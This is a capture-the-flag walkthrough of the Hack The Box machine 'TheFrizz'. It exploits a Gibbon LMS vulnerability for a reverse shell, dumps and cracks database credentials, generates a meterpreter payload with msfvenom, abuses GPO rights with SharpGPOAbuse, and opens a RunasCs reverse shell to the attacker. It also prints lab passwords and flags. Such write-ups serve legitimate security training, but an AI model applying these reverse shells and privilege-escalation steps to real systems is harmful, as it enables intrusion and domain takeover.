---
sticker: emoji//1f9d4-200d-2640-fe0f
---

# PORT SCAN
---

| PORT      | SERVICE       |
|-----------|---------------|
| 22/tcp    | ssh           |
| 53/tcp    | domain        |
| 80/tcp    | http          |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 445/tcp   | microsoft-ds? |
| 464/tcp   | kpasswd5?     |
| 593/tcp   | ncacn_http    |
| 636/tcp   | tcpwrapped    |
| 3268/tcp  | ldap          |
| 3269/tcp  | tcpwrapped    |
| 49664/tcp | msrpc         |
| 49668/tcp | msrpc         |
| 49670/tcp | ncacn_http    |
| 65293/tcp | msrpc         |
| 65297/tcp | msrpc         |
| 65306/tcp | msrpc         |



# RECONNAISSANCE
---

We got a website on port `80`, this machine does not have initial credentials so we cannot perform initial enumeration on ports that require authentication, let's check the web application:

![[Pasted image 20250616142828.png]]


If we check the source code we can find this:

![[Pasted image 20250616142853.png]]



```
V2FudCB0byBsZWFybiBoYWNraW5nIGJ1dCBkb24ndCB3YW50IHRvIGdvIHRvIGphYmwvIFlvdsdscbBSZWFybiB0aGUgYXV4cnhhbG9nb3YycyBvZiB0aGVpciBhcHBsaWNhdGlvbnMuIFRoZXJlIHdpbGwgYmUgbGVnYWwgc2VjdGlvbnMgYXMgaGFja2luZyBpcyBpbGxlZ2FsIGluIG1hbnkgY291bnRyaWVzLg==
```

If we decode the string, nothing interesting can be found:

```
Want to learn hacking but don't want to go to jabl/ YovÇlq°Rearn the auxrxalogov2s of their applications. There will be legal sections as hacking is illegal in many countries.
```

On the source code we can see this too:

![[Pasted image 20250616143718.png]]

There's a `Gibbon LMS` directory on here, if we check it, we can find this:

![[Pasted image 20250616143754.png]]

We find a login page but more importantly, we can find this is running `Gibbon 25.0`, if we search for an exploit, we can find this:


![[Pasted image 20250616165721.png]]

We find `LFI` regarding this version, there's a python script that automates the process, let's use it:

REPO: https://github.com/Zer0F8th/CVE-2023-34598

Let's proceed to exploitation.



# EXPLOITATION
---

Ok, we only did a basic enumeration since we don't have credentials yet, let's use the script and check if it works:

```python
python3 CVE-2023.34598.py scan http://frizzdc.frizz.htb/gibbon-lms
[*] Scanning URL: http://frizzdc.frizz.htb/gibbon-lms
[+] Target appears vulnerable. Saving dump...
[+] Database dump saved to 'Gibbon_dump/gibbon.sql'.
```

Unfortunately for us, the sql file does not contain any relevant info as users, seems like a waste then, if we check for any other exploit on this version, we can find:

![[Pasted image 20250616170727.png]]

We find `CVE-2023-34878` this is a vuln which talks about arbitrary file read that leads to rce, if we search for an exploiit, we can find this one:

Exploit: https://github.com/0xyy66/CVE-2023-45878_to_RCE

![[Pasted image 20250616171019.png]]

Let's do the exploit, we need a Metasploit listener using multi handler, we can use this simple one liner to start it:

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST IP; set LPORT 4444; exploit"
```

Now, start the exploit:


![[Pasted image 20250616171931.png]]

As seen, we get a reverse shell as:

```powershell
C:\xampp\htdocs\Gibbon-LMS>whoami
whoami
frizz\w.webservice
```

Time to look around the machine:

```
C:\xampp\htdocs\Gibbon-LMS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D129-C3DA

 Directory of C:\xampp\htdocs\Gibbon-LMS

06/16/2025  10:16 PM    <DIR>          .
10/29/2024  07:28 AM    <DIR>          ..
01/20/2023  07:04 AM               634 .htaccess
06/16/2025  10:18 PM             7,168 7zip.exe
01/20/2023  07:04 AM           197,078 CHANGEDB.php
01/20/2023  07:04 AM           103,023 CHANGELOG.txt
01/20/2023  07:04 AM             2,972 composer.json
01/20/2023  07:04 AM           294,353 composer.lock
10/11/2024  08:15 PM             1,307 config.php
01/20/2023  07:04 AM             3,733 error.php
01/20/2023  07:04 AM             1,608 export.php
01/20/2023  07:04 AM            32,988 favicon.ico
01/20/2023  07:04 AM             2,277 fullscreen.php
01/20/2023  07:04 AM            57,535 functions.php
01/20/2023  07:04 AM             5,610 gibbon.php
10/29/2024  07:27 AM           493,211 gibbon.sql
01/20/2023  07:04 AM         1,254,473 gibbon_demo.sql
06/16/2025  10:18 PM                33 gibbon_myconfig.php
01/20/2023  07:04 AM    <DIR>          i18n
01/20/2023  07:04 AM            31,228 index.php
01/20/2023  07:04 AM             2,356 indexExport.php
01/20/2023  07:04 AM               813 indexFindRedirect.php
01/20/2023  07:04 AM            12,327 index_fastFinder_ajax.php
01/20/2023  07:04 AM             2,579 index_notification_ajax.php
01/20/2023  07:04 AM             2,767 index_notification_ajax_alarm.php
01/20/2023  07:04 AM             1,690 index_notification_ajax_alarmConfirmProcess.php
01/20/2023  07:04 AM             1,647 index_notification_ajax_alarmProcess.php
01/20/2023  07:04 AM             1,245 index_notification_ajax_alarm_tickUpdate.php
01/20/2023  07:04 AM             2,142 index_parentPhotoDeleteProcess.php
01/20/2023  07:04 AM             3,549 index_parentPhotoUploadProcess.php
01/20/2023  07:04 AM             2,046 index_tt_ajax.php
01/20/2023  07:04 AM    <DIR>          installer
01/20/2023  07:04 AM               753 keepAlive.php
01/20/2023  07:04 AM    <DIR>          lib
01/20/2023  07:04 AM            35,113 LICENSE
01/20/2023  07:04 AM             7,589 login.php
01/20/2023  07:04 AM             1,263 logout.php
01/20/2023  07:04 AM    <DIR>          modules
01/20/2023  07:04 AM             3,905 notifications.php
01/20/2023  07:04 AM             2,110 notificationsActionProcess.php
01/20/2023  07:04 AM             1,163 notificationsDeleteAllProcess.php
01/20/2023  07:04 AM             2,275 notificationsDeleteProcess.php
01/20/2023  07:04 AM             5,007 passwordReset.php
01/20/2023  07:04 AM             9,819 passwordResetProcess.php
01/20/2023  07:04 AM             9,146 preferences.php
01/20/2023  07:04 AM             5,165 preferencesPasswordProcess.php
01/20/2023  07:04 AM             4,367 preferencesProcess.php
01/20/2023  07:04 AM               923 privacyPolicy.php
01/20/2023  07:04 AM             7,184 publicRegistration.php
01/20/2023  07:04 AM             1,355 publicRegistrationCheck.php
01/20/2023  07:04 AM             7,825 publicRegistrationProcess.php
01/20/2023  07:04 AM             2,884 README.md
01/20/2023  07:04 AM             3,521 report.php
01/20/2023  07:04 AM    <DIR>          resources
01/20/2023  07:04 AM                54 robots.txt
01/20/2023  07:04 AM             1,883 roleSwitcherProcess.php
01/20/2023  07:04 AM    <DIR>          src
01/20/2023  07:04 AM    <DIR>          themes
01/20/2023  07:04 AM             2,641 update.php
10/29/2024  07:28 AM    <DIR>          uploads
01/20/2023  07:04 AM    <DIR>          vendor
01/20/2023  07:04 AM             1,288 version.php
01/20/2023  07:04 AM             4,359 yearSwitcherProcess.php
              52 File(s)      2,643,984 bytes
              11 Dir(s)   2,021,502,976 bytes free
```

First of all, we got a configuration file on here, let's check it out:


```php
C:\xampp\htdocs\Gibbon-LMS>type config.php
type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
```


We got credentials for the DB, let's check any other relevant info

```powershell
C:\xampp\htdocs\Gibbon-LMS>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\xampp\htdocs\Gibbon-LMS>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

C:\xampp\htdocs\Gibbon-LMS>net user /domain
net user /domain

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon
c.sandiego               d.hudson                 f.frizzle
g.frizzle                Guest                    h.arm
J.perlstein              k.franklin               krbtgt
l.awesome                m.ramon                  M.SchoolBus
p.terese                 r.tennelli               t.wright
v.frizzle                w.li                     w.Webservice
The command completed successfully.
```

We can find `mysql.exe` on `C:\xampp\mysql\bin`, let's use the credentials we found to check the relevant data on here:

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
```

![[Pasted image 20250616172526.png]]

We got `gibbon` and test, let's search tables on gibbon:

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW TABLES;" gibbon
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
gibbonapplicationformfile
gibbonapplicationformlink
gibbonapplicationformrelationship
gibbonattendancecode
gibbonattendancelogcourseclass
gibbonattendancelogformgroup
gibbonattendancelogperson
gibbonbehaviour
gibbonbehaviourletter
gibboncountry
gibboncourse
gibboncourseclass
gibboncourseclassmap
gibboncourseclassperson
gibboncrowdassessdiscuss
gibboncustomfield
gibbondataretention
gibbondaysofweek
gibbondepartment
gibbondepartmentresource
gibbondepartmentstaff
gibbondiscussion
gibbondistrict
gibbonemailtemplate
gibbonexternalassessment
gibbonexternalassessmentfield
gibbonexternalassessmentstudent
gibbonexternalassessmentstudententry
gibbonfamily
gibbonfamilyadult
gibbonfamilychild
gibbonfamilyrelationship
gibbonfamilyupdate
gibbonfileextension
gibbonfinancebillingschedule
gibbonfinancebudget
gibbonfinancebudgetcycle
gibbonfinancebudgetcycleallocation
gibbonfinancebudgetperson
gibbonfinanceexpense
gibbonfinanceexpenseapprover
gibbonfinanceexpenselog
gibbonfinancefee
gibbonfinancefeecategory
gibbonfinanceinvoice
gibbonfinanceinvoicee
gibbonfinanceinvoiceeupdate
gibbonfinanceinvoicefee
gibbonfirstaid
gibbonfirstaidfollowup
gibbonform
gibbonformfield
gibbonformgroup
gibbonformpage
gibbonformsubmission
gibbonformupload
gibbongroup
gibbongroupperson
gibbonhook
gibbonhouse
gibboni18n
gibbonin
gibboninarchive
gibboninassistant
gibbonindescriptor
gibbonininvestigation
gibbonininvestigationcontribution
gibboninpersondescriptor
gibboninternalassessmentcolumn
gibboninternalassessmententry
gibbonlanguage
gibbonlibraryitem
gibbonlibraryitemevent
gibbonlibrarytype
gibbonlog
gibbonmarkbookcolumn
gibbonmarkbookentry
gibbonmarkbooktarget
gibbonmarkbookweight
gibbonmedicalcondition
gibbonmessenger
gibbonmessengercannedresponse
gibbonmessengerreceipt
gibbonmessengertarget
gibbonmigration
gibbonmodule
gibbonnotification
gibbonnotificationevent
gibbonnotificationlistener
gibbonoutcome
gibbonpayment
gibbonpermission
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
gibbonpersonupdate
gibbonplannerentry
gibbonplannerentrydiscuss
gibbonplannerentryguest
gibbonplannerentryhomework
gibbonplannerentryoutcome
gibbonplannerentrystudenthomework
gibbonplannerentrystudenttracker
gibbonplannerparentweeklyemailsummary
gibbonreport
gibbonreportarchive
gibbonreportarchiveentry
gibbonreportingaccess
gibbonreportingcriteria
gibbonreportingcriteriatype
gibbonreportingcycle
gibbonreportingprogress
gibbonreportingproof
gibbonreportingscope
gibbonreportingvalue
gibbonreportprototypesection
gibbonreporttemplate
gibbonreporttemplatefont
gibbonreporttemplatesection
gibbonresource
gibbonresourcetag
gibbonrole
gibbonrubric
gibbonrubriccell
gibbonrubriccolumn
gibbonrubricentry
gibbonrubricrow
gibbonscale
gibbonscalegrade
gibbonschoolyear
gibbonschoolyearspecialday
gibbonschoolyearterm
gibbonsession
gibbonsetting
gibbonspace
gibbonspaceperson
gibbonstaff
gibbonstaffabsence
gibbonstaffabsencedate
gibbonstaffabsencetype
gibbonstaffapplicationform
gibbonstaffapplicationformfile
gibbonstaffcontract
gibbonstaffcoverage
gibbonstaffcoveragedate
gibbonstaffduty
gibbonstaffdutyperson
gibbonstaffjobopening
gibbonstaffupdate
gibbonstring
gibbonstudentenrolment
gibbonstudentnote
gibbonstudentnotecategory
gibbonsubstitute
gibbontheme
gibbontt
gibbonttcolumn
gibbonttcolumnrow
gibbonttday
gibbonttdaydate
gibbonttdayrowclass
gibbonttdayrowclassexception
gibbonttimport
gibbonttspacebooking
gibbonttspacechange
gibbonunit
gibbonunitblock
gibbonunitclass
gibbonunitclassblock
gibbonunitoutcome
gibbonusernameformat
gibbonyeargroup
```

A bunch of tables on this db apparently, if we take a look, we can find the `gibbonperson` table, maybe on here we can find users:

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E

*************************** 1. row ***************************
           gibbonPersonID: 0000000001
                    title: Ms.
                  surname: Frizzle
                firstName: Fiona
            preferredName: Fiona
             officialName: Fiona Frizzle
         nameInCharacters:
                   gender: Unspecified
                 username: f.frizzle
           passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
       passwordStrongSalt: /aACFhikmNopqrRTVz2489
       passwordForceReset: N
                   status: Full
                 canLogin: Y
      gibbonRoleIDPrimary: 001
          gibbonRoleIDAll: 001
                      dob: NULL
                    email: f.frizzle@frizz.htb
           emailAlternate: NULL
                image_240: NULL
            lastIPAddress: ::1
            lastTimestamp: 2024-10-29 09:28:59
        lastFailIPAddress: NULL
        lastFailTimestamp: NULL
                failCount: 0
                 address1:
         address1District:
          address1Country:
                 address2:
         address2District:
          address2Country:
               phone1Type:
        phone1CountryCode:
                   phone1:
               phone3Type:
        phone3CountryCode:
                   phone3:
               phone2Type:
        phone2CountryCode:
                   phone2:
               phone4Type:
        phone4CountryCode:
                   phone4:
                  website:
            languageFirst:
           languageSecond:
            languageThird:
           countryOfBirth:
     birthCertificateScan:
                ethnicity:
                 religion:
               profession:
                 employer:
                 jobTitle:
           emergency1Name:
        emergency1Number1:
        emergency1Number2:
   emergency1Relationship:
           emergency2Name:
        emergency2Number1:
        emergency2Number2:
   emergency2Relationship:
            gibbonHouseID: NULL
                studentID:
                dateStart: NULL
                  dateEnd: NULL
gibbonSchoolYearIDClassOf: NULL
               lastSchool:
               nextSchool:
          departureReason:
                transport:
           transportNotes:
     calendarFeedPersonal:
       viewCalendarSchool: Y
     viewCalendarPersonal: Y
 viewCalendarSpaceBooking: N
  gibbonApplicationFormID: NULL
             lockerNumber:
      vehicleRegistration:
       personalBackground:
        messengerLastRead: NULL
                  privacy: NULL
                  dayType: NULL
    gibbonThemeIDPersonal: NULL
     gibboni18nIDPersonal: NULL
        studentAgreements: NULL
    googleAPIRefreshToken:
 microsoftAPIRefreshToken:
   genericAPIRefreshToken:
receiveNotificationEmails: Y
                mfaSecret: NULL
                 mfaToken: NULL
            cookieConsent: NULL
                   fields:
```

As seen, we got a username and a password hash with a salt, we can use john to crack it in the following way, first save this on a file:

```
f.frizzle:$dynamic_0$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```

Then we can use john:

```bash
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt frizzle.hash

Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=sha256($s.$p) [128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Jenni_Luvs_Magic23 (f.frizzle)
1g 0:00:00:01 DONE (2025-06-16 22:32) 0.6329g/s 6975Kp/s 6975Kc/s 6975KC/s Jer125..Jeepgal1982
Use the "--show --format=dynamic=sha256($s.$p)" options to display all of the cracked passwords reliably
```

We got our credentials:

```
f.frizzle:Jenni_Luvs_Magic23
```

If we remember from the scan, `winrm` is not enabled on this machine, we need to use ssh which is actually enabled on default port `22`, let's go into ssh:

![[Pasted image 20250616173906.png]]


If we try going into ssh the normal way, we get what can be seen above, we need to set up a few things before, yes, this part was a little annoying but here's what you need to do, on this point onwards, I will use kali instead of arch as I usually do:


```
# Make sure frizzdc.frizz.htb is on your /etc/hosts file
sudo ntpdate frizzdc.frizz.htb    
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb    
export KRB5CCNAME=f.frizzle.ccache  
```

We also need to set our `/etc/krb5.conf` file with this:

```conf
[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    FRIZZ.HTB = {
        kdc = frizz.htb
        admin_server = frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```

Now we can do;

```
ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes f.frizzle@frizz.htb -K
```

![[Pasted image 20250616175003.png]]

Got our shell, let's proceed to privilege escalation.



# PRIVILEGE ESCALATION
---

So, we already got credentials and access to ssh, what we're missing is one of the most important steps when doing an AD machine, using bloodhound, let's do it:

```python
bloodhound-python -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -dc frizzdc.frizz.htb -ns 10.10.11.60 -c all --zip
```

As I always recommend:

> Note: If you want to flush all previous data from bloodhound, you can go to `http://localhost:7474` and perform the following query:

```
MATCH (n)
DETACH DELETE n
```

![[Pasted image 20250616175626.png]]

An interesting finding is that `M.SCHOOLBUS` owns a bunch of users, and got `WriteGPLink` over domain controllers and class_frizz:

![[Pasted image 20250616175812.png]]

Class_frizz contains `v.frizzle` which is a domain admin user:

![[Pasted image 20250616175932.png]]
![[Pasted image 20250616175942.png]]

Nothing more relevant can be found on here, so seems like we need to check how to get into `M.SCHOOLBUS` on ssh, let's try using `winpwas` to have a further understanding of what we can do on here, you can get winpeas.ps1 on your linux machine and download it using:

```powershell
Invoke-WebRequest http://IP:8000/winPEAS.ps1 -OutFile C:\Users\f.frizzle\winpeas.ps1
```

![[Pasted image 20250616182652.png]]

Some relevant info was found but nothing too relevant, following the tip of the recycle bin, I searched for files that may have been deleted and may be on there, let's use these Powershell commands:

```powershell
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.items() | Select-Object Name, Path
```

We can see this:

![[Pasted image 20250616182951.png]]

We got a `wapt-backup-sunday.7z` file, there's a backup on the recycle bin what we can restore the file with this:

```powershell
$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)  
$items = $recycleBin.Items()  
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}  
$documentsPath = [Environment]::GetFolderPath("Desktop")  
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)  
$documents.MoveHere($item)
```

![[Pasted image 20250616183103.png]]

We can now see the file on our desktop, we need a way to download it, this can be done using `meterpreter`, let's do the following:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meterpreter.exe
```

Now, with the `meterpreter.exee` file, we can download it again as we did with winpeas:

```powershell
Invoke-WebRequest "http://IP:8000/meterpreter.exe" -OutFile "meterpreter.exe"
```

Now we need to open metasploit with `exploit/multi/handler` and get our shell, make sure to set the payload to:

```
windows/meterpreter/reverse_tcp
```

Run the `meterpreter.exe` and you will get a shell:

![[Pasted image 20250616183827.png]]

Now we can download our file:

```
download C:\\Users\\f.frizzle\\Desktop\\wapt-backup-sunday.7z
```

Now once we got our file, we need to unzip it:

```
7z x wapt-backup-sunday.7z
```

We will see this:

```
/AD/rooms/HTB/thefrizz/wapt$ ls
auth_module_ad.py   setuphelpers_linux.py     waptguihelper.pyd
cache               setuphelpers_macos.py     waptlicences.pyd
common.py           setuphelpers.py           waptmessage.exe
conf                setuphelpers_unix.py      waptpackage.py
conf.d              setuphelpers_windows.py   wapt.psproj
COPYING.txt         ssl                       waptpython.exe
db                  templates                 waptpythonw.exe
DLLs                trusted_external_certs    wapt-scanpackages.py
keyfinder.py        unins000.msg              waptself.exe
keys                version-full              waptserver.exe
languages           waptbinaries.sha256       waptservice.exe
lib                 waptconsole.exe.manifest  wapt-signpackages.py
licencing.py        waptcrypto.py             wapttftpserver
log                 wapt-enterprise.ico       wapttftpserver.exe
private             wapt-get.exe              wapttray.exe
__pycache__         wapt-get.exe.manifest     waptutils.py
revision.txt        wapt-get.ini              waptwua
Scripts             wapt-get.ini.tmpl         wgetwads32.exe
setupdevhelpers.py  wapt-get.py               wgetwads64.exe

/AD/rooms/HTB/thefrizz/wapt/conf$ ls
ca-192.168.120.158.crt  require_ssl_auth.conf  waptserver.ini.template
ca-192.168.120.158.pem  uwsgi_params
forward_ssl_auth.conf   waptserver.ini

```

As seen we got a `waptserver.ini` file, let's check it:

```
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

Got a base64 string as the password:

```bash
echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
!suBcig@MehTed!R
```

Got a password, this is most likely the password of `M.Schoolbus` due to the privileges of the user being similar to administrator ones, let's go into ssh again to check it out:

```
impacket-getTGT frizz.htb/'M.SchoolBus':'!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb

export KRB5CCNAME=M.SchoolBus.ccache

ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes M.SchoolBus@frizz.htb -K
```

![[Pasted image 20250616184457.png]]

Ok, the last step we need is to exploit that we are able to create a GPO as shown in bloodhound, for this, we can use `SharpGPOABUSE`:

FILE: https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe

We need to get the file into our machine, can be done using the same method as before:

```powershell
Invoke-WebRequest "http://10.10.14.40:8000/SharpGPOAbuse.exe" -OutFile "SharpGPOAbuse.exe"
```

Once we got our file, we can begin, first of all we must create the GPO over domain controllers:

```powershell
New-GPO -Name New-GPO | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

![[Pasted image 20250616185424.png]]


Now, we can use the tool in our new GPO to get the same privilege as admin:

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName New-GPO --force
```

![[Pasted image 20250616185448.png]]

Now we need to update:

```
gpupdate /force
```

![[Pasted image 20250616191049.png]]

![[Pasted image 20250616193341.png]]

As seen, we got same rights as admin, after that using `runasCS` we can send ourselves a shell or read the root flag:

```
.\RunasCs.exe "M.SchoolBus" "!suBcig@MehTed!R" powershell.exe -r IP:9001 --remote-impersonation --logon-type 3
```

Now we simply can use `nc`:

```
nc -lvnp 9001
```

We need to get `runasCS.exe` before doing all this, you can get it on here:

REPO: https://github.com/antonioCoco/RunasCs/releases

Unzip the file and you will get it:

![[Pasted image 20250616185949.png]]

Now, use the same method to get it on our windows machine:

```
Invoke-WebRequest -Uri "http://IP:8000/RunasCs.exe" -OutFile "RunasCs.exe"
```

If we simply want to read root flag, we can do:

```
\RunasCs.exe M.SchoolBus "!suBcig@MehTed!R" "cmd /c type C:\Users\Administrator\Desktop\root.txt" -l 2 -f 2 --bypass-uac    

79cf6d3be2e1e49b4a39a156a363eb9e
```

We can read both flags then:

```
PS C:\Users\f.frizzle> type C:\Users\f.frizzle\Desktop\user.txt
cdea7fdecdd95ce9e7c3734af9bfeaae

PS C:\Users\M.SchoolBus> .\RunasCs.exe M.SchoolBus "!suBcig@MehTed!R" "cmd /c type C:\Users\Administrator\Desktop\root.txt" -l 2 -f 2 --bypass-uac    

79cf6d3be2e1e49b4a39a156a363eb9e
```

![[Pasted image 20250616194457.png]]

https://www.hackthebox.com/achievement/machine/1872557/652


